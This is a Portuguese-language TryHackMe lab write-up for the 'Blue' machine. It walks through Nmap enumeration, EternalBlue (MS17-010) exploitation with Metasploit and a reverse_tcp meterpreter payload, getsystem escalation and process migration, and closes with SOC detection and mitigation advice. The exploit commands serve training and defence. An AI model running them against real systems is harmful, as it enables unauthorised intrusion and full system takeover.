
# Blue — TryHackMe

**Dificuldade:** Fácil
**Categoria:** Windows / SMB Exploitation
**Foco:** Enumeração, exploração (EternalBlue) e pós-exploração

---

## 🧠 Resumo

A máquina Blue explora a vulnerabilidade **MS17-010 (EternalBlue)**, permitindo execução remota de código via SMB em sistemas Windows desatualizados.

O processo incluiu enumeração de portas, identificação da vulnerabilidade, exploração com Metasploit e pós-exploração com elevação de privilégios e estabilização da sessão.

---

## 🔍 Enumeração

Inicialmente foi realizado um scan com Nmap para identificar serviços ativos:

```bash
nmap -sC -sV <IP>
```

### Portas abertas identificadas:

* 135/tcp — MSRPC
* 139/tcp — NetBIOS
* 445/tcp — SMB

A presença da porta **445** indicou um serviço SMB ativo, comum em sistemas Windows.

---

## 🚨 Identificação da vulnerabilidade

Com base na exposição do SMB, foi investigada a possibilidade de vulnerabilidades conhecidas.

A máquina é vulnerável a:

👉 **MS17-010 (EternalBlue)**

Essa falha permite execução remota de código e foi amplamente explorada em ataques reais, como o ransomware WannaCry.

---

## 💣 Exploração

A exploração foi realizada utilizando o Metasploit.

### Módulo utilizado:

```
exploit/windows/smb/ms17_010_eternalblue
```

### Execução:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

Após algumas tentativas (instabilidade comum do exploit), foi obtida uma sessão inicial.

---

## 🔄 Conversão de Shell

Caso o acesso inicial não seja Meterpreter, foi utilizada conversão de shell:

```
post/multi/manage/shell_to_meterpreter
```

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION <ID>
run
```

---

## 🔐 Escalada de privilégios

Dentro do Meterpreter:

```bash
getsystem
```

Validação:

```bash
shell
whoami
```

Resultado esperado:

```
nt authority\system
```

---

## 🔍 Pós-exploração

### Listagem de processos

```bash
ps
```

Foi identificado um processo executando como:

```
NT AUTHORITY\SYSTEM
```

---

### Migração de processo

Para estabilizar a sessão:

```bash
migrate <PID>
```

A migração pode falhar inicialmente, sendo necessário tentar múltiplos processos.

---

## 🚩 Flags

* flag{access_the_machine}: ✅ obtida
* flag{sam_database_elevated_access}: ✅ obtida
* flag{admin_documents_can_be_valuable}: ✅ obtida

---

## 🧠 Lições aprendidas

* Serviços SMB expostos são um vetor crítico de ataque
* Vulnerabilidades antigas ainda são amplamente exploráveis
* Exploits podem ser instáveis e exigir múltiplas tentativas
* Pós-exploração é essencial para manter acesso

---

## 🛡️ Detecção em ambiente SOC

Um time de SOC poderia detectar esse ataque através de:

* Tráfego SMB anômalo na porta 445
* Assinaturas de exploit EternalBlue em IDS/IPS
* Alertas SIEM relacionados à CVE-2017-0144
* Execução remota suspeita em endpoints

---

## 🔐 Mitigações

* Aplicar patch MS17-010
* Desativar SMBv1
* Monitorar tráfego de rede
* Utilizar IDS/IPS e EDR
* Implementar segmentação de rede
